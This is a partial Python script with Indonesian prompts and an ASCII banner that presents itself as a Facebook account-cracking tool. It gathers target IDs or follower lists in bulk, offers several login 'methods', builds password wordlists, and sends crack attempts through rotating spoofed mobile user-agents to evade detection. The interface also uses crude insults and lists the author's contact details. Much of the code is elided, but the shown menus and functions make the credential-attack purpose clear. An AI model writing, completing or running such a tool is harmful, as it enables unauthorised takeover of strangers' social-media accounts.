#DIMOHOM BELAJAR CODING SENDIRI#
#IMPORT MODULE
...
███╗   ███╗███████╗████████╗ █████╗
 ...
 ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
 ▌│█║▌║▌║META FACEBOOK METHOD D.FACEBOK║▌║▌║█│▌
╔════════════════════════════════════════╗
║[•] SCRIPT INI DI KEMBANGAN OLEH : R I D W A N
║[•] Whatsapp  : +88013188058**
║[•] Github    : github.com/arman3
║[•] SC Status : C.E.O KING ARMAN
║[•] Support   : 64bit\32bit                  
║[•] SC Versi: 0.2           
╚════════════════════════════════════════╝'''
...
def menu(my_name,my_id):
	...
	print('|')
	print(f'{H}[01:CRAK DARI ID PUBLIK')
	print(f'[02:CRAK DARI FOLOWS] ')
	print(' [00:KELUAR/HAPUS KUE]')
	print('|')
	_____ridwan__wibu_____ = input('\rPilih : ')
	if _____ridwan__wibu_____ in ['1']:
		dump_massal()
	elif _____ridwan__wibu_____ in ['2']:
		dump_follower()
	elif _____ridwan__wibu_____ in ['0']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(' ANDA MAU BERAPA TARGET?: '))
	except ValueError:
		print('JANGAN BANYAK BANYAK')
		exit()
	if jum<1 or jum>100:
		print('GAGAL DUMP ID ')
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input('SILAKAN MASUKAN ID TARGET KE'+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('|')
		print(f'{H}BERHASIL TERKUMPUL→'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def lah():
	print(f'\n{H}Total Idz Yang Terkumpul : %s '%(len(id)))
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[green][01:CRAK FORMS OLD]\n[gree][02:CRAK FORMS NEW]\n[green][03:CRAK RANDOM JUST NOW] '))
	print('|')
	hu = input('Pilih : ')
	if hu in ['1','01']:
		...
		exit()
		print(f'APKAH ANDA YAKIN INGIN MENGUNAKAN USER-AGENT INI? y/n:{uak}') 
		hu = input('yakin?:') 
		
	cetak(nel('\t[green][01:X.FACEBOK]\n[02:FREE]\n[03:D.FACEBOK(masih dalam)]\n[04:MOBILE]\n[05:O.FACEBOK]'))
	print('|')
	hc = input('Pilih : ')
	if hc in ['3','2']:
		...
		method.append('mobile')
	print('|')
	_jembot_ = input('Tambahkan Aplikasi ( Y/n ) ')
	if _jembot_ in ['']:
		print(' Pilih Yang Bener Kontol ')
		back()
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('\t [green] SELAMAT [MENGCRAK]'))
...
def crack(idf,pwv):
	...
	ua = random.choice(['Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/371.1.0.12.107;]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148','Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.1.1; Android SDK built for x86 Build/LMY48X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 12; en-US; CPH2365 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36:','Mozilla/5.0 (Linux; U; Android 10; TECNO KE5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPR/64.0.2254.62526',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G925F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; BDL8051C Build/BDL3552T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Safari/537.36',
...
if __name__=='__main__':
	...
	alvino_xy(f'\n\t{H}WELCOME TOO SCRIPT RIDWAN-XD\nSCRIPT MELUPAKAN PREBADI\nPERATURAN\n1:JANGAN DI SEBAR/ATAU DI PERJUAL BELIKAN\n2:SILAKAN MEMPOLEH IZIN DULU KE CONTAT:083862287464\nSEBELUM NYA TERIMAKASIH')
	time.sleep(3)
	login()
